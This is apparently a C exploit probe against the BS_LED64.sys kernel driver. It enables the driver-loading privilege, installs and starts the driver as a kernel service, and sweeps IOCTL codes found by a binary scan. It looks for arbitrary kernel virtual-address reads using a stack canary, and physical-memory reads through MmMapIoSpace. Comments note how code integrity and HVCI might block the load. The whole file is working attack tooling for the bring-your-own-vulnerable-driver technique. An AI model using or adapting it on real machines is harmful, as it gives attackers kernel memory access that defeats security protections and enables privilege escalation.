/*
 * bsled_probe.c -- BS_LED64.sys IOCTL surface probe
 * tests KVA canary read + physical PA read
 * tells us immediately whether MmMapIoSpace is live or returns NULL
 *
 * clang bsled_probe.c -o bsled_probe.exe -lkernel32 -ladvapi32
 * run as Admin: .\bsled_probe.exe ..\..\BS_LED64.sys
 */
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>


#define BS_DEVICE "\\\\.\\BS_LED"
#define BS_SVC "BS_LED"

/* IOCTLs from binary scan */
static const DWORD kCodes[] = {
    0x00226040, /* fn=0x810 METHOD_BUFFERED FILE_READ_ACCESS  */
    0x00226108, /* fn=0x842 METHOD_BUFFERED FILE_READ_ACCESS  */
    0x0022610C, /* fn=0x843 METHOD_BUFFERED FILE_READ_ACCESS  */
    0x0022C20D, /* fn=0x083 METHOD_IN_DIRECT FILE_READ_WRITE  */
};
#define N_CODES (sizeof(kCodes) / sizeof(kCodes[0]))

static BOOL svc_load(const char *abs) {
  char nt[MAX_PATH + 8];
  snprintf(nt, sizeof(nt) - 1, "\\??\\%s", abs);
  SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
  if (!scm)
    return FALSE;
  SC_HANDLE s = OpenServiceA(scm, BS_SVC, SERVICE_ALL_ACCESS);
  if (s) {
    SERVICE_STATUS ss = {0};
    ControlService(s, SERVICE_CONTROL_STOP, &ss);
    Sleep(300);
    DeleteService(s);
    CloseServiceHandle(s);
    Sleep(300);
  }
  s = CreateServiceA(scm, BS_SVC, BS_SVC, SERVICE_ALL_ACCESS,
                     SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                     SERVICE_ERROR_NORMAL, nt, NULL, NULL, NULL, NULL, NULL);
  if (!s) {
    CloseServiceHandle(scm);
    return FALSE;
  }
  BOOL ok = StartServiceA(s, 0, NULL);
  if (!ok && GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
    ok = TRUE;
  CloseServiceHandle(s);
  CloseServiceHandle(scm);
  if (ok)
    Sleep(400);
  return ok;
}
static void svc_unload(void) {
  SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
  if (!scm)
    return;
  SC_HANDLE s = OpenServiceA(scm, BS_SVC, SERVICE_ALL_ACCESS);
  if (s) {
    SERVICE_STATUS ss = {0};
    ControlService(s, SERVICE_CONTROL_STOP, &ss);
    Sleep(200);
    DeleteService(s);
    CloseServiceHandle(s);
  }
  CloseServiceHandle(scm);
}

int main(int argc, char **argv) {
  const char *path = argc > 1 ? argv[1] : "..\\..\\BS_LED64.sys";
  char abs[MAX_PATH] = {0};
  GetFullPathNameA(path, MAX_PATH, abs, NULL);
  printf("[*] BS_LED64 probe\n[*] driver: %s\n\n", abs);

  HANDLE ht = NULL;
  OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                   &ht);
  LUID l;
  LookupPrivilegeValueA(NULL, "SeLoadDriverPrivilege", &l);
  TOKEN_PRIVILEGES tp = {1, {{l, SE_PRIVILEGE_ENABLED}}};
  AdjustTokenPrivileges(ht, FALSE, &tp, sizeof(tp), NULL, NULL);
  CloseHandle(ht);

  printf("[*] loading driver...\n");
  if (!svc_load(abs)) {
    printf("[-] load failed: %lu", GetLastError());
    DWORD e = GetLastError();
    if (e == 1275)
      printf(" (BLOCKED by CI.dll -- analysis wrong)");
    if (e == 577)
      printf(" (Authenticode rejected by kernel)");
    if (e == 5)
      printf(" (access denied -- HVCI?)");
    printf("\n");
    return 1;
  }
  printf("[+] driver loaded\n");

  HANDLE dev = CreateFileA(BS_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (dev == INVALID_HANDLE_VALUE) {
    /* try alternate name */
    dev = CreateFileA("\\\\.\\BS_LED64", GENERIC_READ | GENERIC_WRITE, 0, NULL,
                      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  }
  if (dev == INVALID_HANDLE_VALUE) {
    printf("[-] device open failed: %lu\n", GetLastError());
    svc_unload();
    return 1;
  }
  printf("[+] device handle: %p\n\n", (void *)dev);

  /* canary on our stack -- KVA read test */
  volatile DWORD canary = 0xDEADBEEF;
  uint64_t kva = (uint64_t)(uintptr_t)&canary;
  printf("[*] canary VA=0x%016llX  val=0x%08lX\n\n", (unsigned long long)kva,
         (unsigned long)canary);

  printf("=== IOCTL SWEEP -- user VA canary, various struct layouts ===\n");
  printf("%-12s %-4s %-4s  %-6s  %-10s  %s\n", "IOCTL", "adOff", "sz", "result",
         "value", "note");

  int hits = 0;

  for (int ci = 0; ci < (int)N_CODES; ci++) {
    DWORD code = kCodes[ci];

    /* try 5 common layouts */
    for (int addr_off = 0; addr_off <= 16; addr_off += 8) {
      for (int sz = 8; sz <= 32; sz += 4) {
        if (addr_off + 8 > sz)
          continue;

        uint8_t ibuf[48] = {0}, obuf[48] = {0};
        memcpy(ibuf + addr_off, &kva, 8);

        DWORD ret = 0;
        BOOL ok = DeviceIoControl(dev, code, ibuf, sz, obuf, sz, &ret, NULL);
        DWORD err = ok ? 0 : GetLastError();

        if (err != 87) {
          /* scan all output offsets for canary */
          for (int vo = 0; vo + 4 <= sz; vo += 4) {
            DWORD v = 0;
            memcpy(&v, obuf + vo, 4);
            const char *note = "";
            if (v == 0xDEADBEEF)
              note = " *** KVA READ CONFIRMED ***";
            else if (err == 31)
              note = " (struct OK, addr issue)";
            else if (err == 5)
              note = " (access denied)";
            printf("0x%08lX %-4d %-4d  %-6s  0x%08lX    err=%lu%s\n",
                   (unsigned long)code, addr_off, sz, ok ? "OK" : "FAIL",
                   (unsigned long)v, (unsigned long)err, note);
            hits++;
          }
        }
      }
    }
  }

  if (!hits) {
    printf("all returned 87 -- trying physical PA probes\n\n");

    /* PA probe: test if MmMapIoSpace works on this VBS machine */
    uint64_t test_pas[] = {0x1000ULL, 0x100000ULL, 0x1000000ULL, 0x40000000ULL};

    printf("=== PA PROBE (struct: {uint64 PA, uint32 size}) ===\n");
    for (int ci = 0; ci < (int)N_CODES; ci++) {
      for (int pi = 0; pi < 4; pi++) {
        uint8_t buf[32] = {0}, out[32] = {0};
        memcpy(buf, &test_pas[pi], 8);
        *(uint32_t *)(buf + 8) = 4;

        DWORD ret = 0;
        BOOL ok =
            DeviceIoControl(dev, kCodes[ci], buf, 16, out, 16, &ret, NULL);
        DWORD err = ok ? 0 : GetLastError();
        DWORD val = 0;
        memcpy(&val, out, 4);

        if (err != 87)
          printf("0x%08lX PA=0x%010llX  %s  val=0x%08lX  err=%lu%s\n",
                 (unsigned long)kCodes[ci], (unsigned long long)test_pas[pi],
                 ok ? "OK" : "FAIL", (unsigned long)val, (unsigned long)err,
                 val ? "  <-- DATA" : "  (zero/failed)");
      }
    }
  }

  CloseHandle(dev);
  svc_unload();
  printf("\n[*] probe done\n");
  return 0;
}